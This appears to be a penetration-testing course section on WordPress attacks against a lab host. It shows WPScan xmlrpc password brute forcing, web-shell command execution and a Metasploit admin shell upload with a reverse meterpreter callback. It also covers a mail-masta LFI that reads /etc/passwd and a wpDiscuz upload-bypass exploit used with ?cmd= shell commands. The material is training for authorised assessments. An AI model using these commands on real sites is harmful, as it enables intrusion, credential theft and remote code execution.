## Login Bruteforce

WPScan can be used to brute force usernames and passwords. The tool uses two kinds of login brute force attacks, [xmlrpc](https://kinsta.com/blog/xmlrpc-php/) and wp-login. The `wp-login` method will attempt to brute force the standard WordPress login page, while the `xmlrpc` method uses WordPress API to make login attempts through `/xmlrpc.php`. The `xmlrpc` method is preferred as it’s faster:
```shell-session
$ sudo wpscan --password-attack xmlrpc -t 20 -U john -P /usr/share/wordlists/rockyou.txt --url http://blog.inlanefreight.local
```

## Code Execution

With administrative access to WordPress, we can modify the PHP source code to execute system commands. Click on `Appearance` on the side panel and select Theme Editor. This page will let us edit the PHP source code directly. An inactive theme can be selected to avoid corrupting the primary theme. We already know that the active theme is Transport Gravity. An alternate theme such as Twenty Nineteen can be chosen instead.

We add this single line to the file just below the comments to avoid too much modification of the contents:
![[theme_editor.webp]]

WordPress themes are located at `/wp-content/themes/<theme name>`. We can interact with the web shell via the browser or using `cURL`. As always, we can then utilize this access to gain an interactive reverse shell and begin exploring the target:
```shell-session
$ curl http://blog.inlanefreight.local/wp-content/themes/twentynineteen/404.php?0=id
```

The [wp_admin_shell_upload](https://www.rapid7.com/db/modules/exploit/unix/webapp/wp_admin_shell_upload/) module from Metasploit can be used to upload a shell and execute it automatically.

The module uploads a malicious plugin and then uses it to execute a PHP Meterpreter shell:
```shell-session
msf6 > use exploit/unix/webapp/wp_admin_shell_upload 

[*] No payload configured, defaulting to php/meterpreter/reverse_tcp

msf6 exploit(unix/webapp/wp_admin_shell_upload) > set rhosts blog.inlanefreight.local
msf6 exploit(unix/webapp/wp_admin_shell_upload) > set username john
msf6 exploit(unix/webapp/wp_admin_shell_upload) > set password firebird1
msf6 exploit(unix/webapp/wp_admin_shell_upload) > set lhost 10.10.14.15 
msf6 exploit(unix/webapp/wp_admin_shell_upload) > set rhost 10.129.42.195  
msf6 exploit(unix/webapp/wp_admin_shell_upload) > set VHOST blog.inlanefreight.local
```

Sometimes we will have to use both the vhost and the IP address, or the exploit will fail with the error `Exploit aborted due to failure: not-found: The target does not appear to be using WordPress`.

Many Metasploit modules (and other tools) attempt to clean up after themselves, but some fail. During an assessment, we would want to make every attempt to clean up this artifact from the client system and, regardless of whether we were able to remove it or not, we should list this artifact in our report appendices. At the very least, our report should have an appendix section that lists the following information:

- Exploited systems (hostname/IP and method of exploitation)
- Compromised users (account name, method of compromise, account type (local or domain))
- Artifacts created on systems
- Changes (such as adding a local admin user or modifying group membership)

## Leveraging Known Vulnerabilities

The vast majority of WordPress vulnerabilities can be found in plugins. According to the WordPress Vulnerability Statistics page hosted [here](https://wpscan.com/statistics), at the time of writing, there were 23,595 vulnerabilities in the WPScan database. These vulnerabilities can be broken down as follows:

- 4% WordPress core
- 89% plugins
- 7% themes

The number of vulnerabilities related to WordPress has grown steadily since 2014, likely due to the sheer amount of free (and paid) themes and plugins available, with more and more being added every week. For this reason, we must be extremely thorough when enumerating a WordPress site as we may find plugins with recently discovered vulnerabilities or even old, unused/forgotten plugins that no longer serve a purpose on the site but can still be accessed.

Note: We can use the [waybackurls](https://github.com/tomnomnom/waybackurls) tool to look for older versions of a target site using the Wayback Machine. Sometimes we may find a previous version of a WordPress site using a plugin that has a known vulnerability. If the plugin is no longer in use but the developers did not remove it properly, we may still be able to access the directory it is stored in and exploit a flaw.

### Vulnerable Plugins - mail-masta

The plugin [mail-masta](https://wordpress.org/plugins/mail-masta/) is no longer supported but has had over 2,300 [downloads](https://wordpress.org/plugins/mail-masta/advanced/) over the years. It's not outside the realm of possibility that we could run into this plugin during an assessment, likely installed once upon a time and forgotten. Since 2016 it has suffered an [unauthenticated SQL injection](https://www.exploit-db.com/exploits/41438) and a [Local File Inclusion](https://www.exploit-db.com/exploits/50226).

Let's take a look at the vulnerable code for the mail-masta plugin:
```php
<?php 

include($_GET['pl']);
global $wpdb;

$camp_id=$_POST['camp_id'];
$masta_reports = $wpdb->prefix . "masta_reports";
$count=$wpdb->get_results("SELECT count(*) co from  $masta_reports where camp_id=$camp_id and status=1");

echo $count[0]->co;

?>
```

As we can see, the `pl` parameter allows us to include a file without any type of input validation or sanitization. Using this, we can include arbitrary files on the webserver. Let's exploit this to retrieve the contents of the `/etc/passwd` file using `cURL`:
```shell-session
$ curl -s http://blog.inlanefreight.local/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/passwd
```

### Vulnerable Plugins - wpDiscuz

[wpDiscuz](https://wpdiscuz.com/) is a WordPress plugin for enhanced commenting on page posts. At the time of writing, the plugin had over [1.6 million downloads](https://wordpress.org/plugins/wpdiscuz/advanced/) and over 90,000 active installations. Based on the version number (7.0.4), this [exploit](https://www.exploit-db.com/exploits/49967) has a pretty good shot of getting us command execution. The crux of the vulnerability is a file upload bypass. wpDiscuz is intended only to allow image attachments. The file mime type functions could be bypassed, allowing an unauthenticated attacker to upload a malicious PHP file and gain remote code execution.

The exploit script takes two parameters: `-u` the URL and `-p` the path to a valid post:
```shell-session
$ python3 wp_discuz.py -u http://blog.inlanefreight.local -p /?p=1
```

The exploit as written may fail, but we can use `cURL` to execute commands using the uploaded web shell. We just need to append `?cmd=` after the `.php` extension to run commands which we can see in the exploit script:
```shell-session
$ curl -s http://blog.inlanefreight.local/wp-content/uploads/2021/08/uthsdkbywoxeebg-1629904090.8191.php?cmd=id

GIF689a;

uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

In this example, we would want to make sure to clean up the `uthsdkbywoxeebg-1629904090.8191.php` file and once again list it as a testing artifact in the appendices of our report.